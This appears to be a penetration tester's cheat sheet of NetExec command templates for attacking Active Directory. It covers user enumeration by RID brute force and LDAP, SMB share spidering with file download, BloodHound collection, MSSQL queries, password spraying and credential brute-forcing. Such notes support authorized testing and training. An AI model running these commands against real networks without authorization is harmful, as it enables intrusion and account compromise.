# NetExec
#target/remote #os/linux #cat/ad

## Generate/append hosts file
```
rm /tmp/hosts.txt 2>/dev/null; nxc smb <cidr> --generate-hosts-file /tmp/hosts.txt; tee -a /etc/hosts < /tmp/hosts.txt; sed -i 's/\s.*//' /tmp/hosts.txt; rm /tmp/hosts.txt
```

## Generate/append krb5 config
```
nxc smb <ip> --generate-krb5-file /etc/krb5.conf
```

## Query userlist from RID bruteforce
```
nxc smb <ip> -u '<user>' <auth> --rid-brute 10000 --log $(pwd)/smb.out; cat smb.out | grep TypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users.txt
```

## Query userlist from LDAP
```
nxc ldap <ip> -u '<user>' <auth> --users | tee /dev/tty | awk '/-Username-/{p=1; next} p && /^LDAP/{print $5}' > users.txt
```

## spider plus
```
nxc smb <ip> -u '<user>' <auth> -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.; cat <ip>.json | jq '. | map_values(keys)'
```

## nxc bloodhound-ce
```
nxc ldap <ip> -u '<user>' <auth> --bloodhound -c all --dns-server <dc_ip>
```

## Query mssql
```
nxc mssql <ip> -u '<user>' <auth> -q '<mssql_query>'
```

## Password spray
```
nxc smb <ip> -u <userlist|users.txt> -p <password> -k --continue-on-success
```

## Bruteforce userlist
```
nxc smb <ip> -u <userlist|users.txt> -p <userlist|users.txt> -k --no-bruteforce --continue-on-success
```
